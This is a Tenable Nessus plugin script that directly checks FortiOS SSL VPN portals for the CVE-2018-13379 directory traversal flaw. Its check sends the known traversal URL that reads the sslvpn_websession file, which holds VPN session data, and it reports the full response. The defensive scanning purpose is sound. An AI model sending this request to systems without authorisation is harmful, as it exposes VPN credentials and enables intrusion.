#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(128552);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/12/05");

  script_cve_id("CVE-2018-13379");
  script_bugtraq_id(108693);
  script_xref(name:"IAVA", value:"0001-A-0002-S");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");
  script_xref(name:"CISA-NCAS", value:"AA22-011A");
  script_xref(name:"CEA-ID", value:"CEA-2020-0129");
  script_xref(name:"CEA-ID", value:"CEA-2021-0020");

  script_name(english:"Fortinet FortiOS SSL VPN Directory Traversal Vulnerability (FG-IR-18-384) (Direct Check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of FortiOS 5.6.3 prior to 5.6.8 or 6.0.x prior to 6.0.5. It is, therefore,
affected by a directory traversal vulnerability in the SSL VPN web portal, due to improper sanitization of path 
traversal characters in URLs. An unauthenticated, remote attacker can exploit this, via a specially crafted HTTP 
request, to download arbitrary FortiOS system files.");
  # https://fortiguard.com/psirt/FG-IR-18-384
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fa8b8063");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Fortinet FortiOS version to 5.6.8, 6.0.5, 6.2.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2018-13379");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Fortinet FortiGate SSL VPN File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/05/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/05/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:fortinet:fortios");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Firewalls");

  script_copyright(english:"This script is Copyright (C) 2019-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 443);

  exit(0);
}

include('audit.inc');
include('http.inc');
include('spad_log_func.inc');

port = get_http_port(default:443);
url = '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession';

response = http_send_recv3(
  method:'GET',
  item:url,
  port:port,
  exit_on_fail:TRUE
);

spad_log(message:'Request: \n' + http_last_sent_request() + '\n');
spad_log(message:'Response: \n' +  join(response) + '\n');

if ('200 OK' >!<  response[0] || response[2] !~ 'var fgt_lang =') audit(AUDIT_HOST_NOT, 'affected');

report =
  '\nNessus was able exploit this issue using the following URL :\n' +
  '\n' + build_url(port:port, qs:url) + '\n' +
  '\nThe string representation of the response from the target host was: ' + '\n'  + obj_rep(response[2]) + '\n'; 
security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
